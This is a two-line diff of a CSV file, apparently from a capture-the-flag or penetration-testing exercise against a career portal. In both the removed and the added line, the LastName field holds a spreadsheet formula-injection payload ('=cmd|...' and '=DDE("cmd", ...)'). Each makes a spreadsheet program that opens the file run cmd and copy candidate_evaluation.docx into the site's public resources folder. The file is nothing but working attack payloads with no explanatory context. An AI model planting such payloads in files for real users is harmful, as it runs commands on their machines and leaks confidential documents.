@@ -1,2 +1,2 @@
-"Name", "LastName"
-"Mister", "=cmd|' /C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\a.a) '!A0"
+Name, LastName
+Mister," =DDE(""cmd"", ""/C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\dde2"", ""222"")!a0"
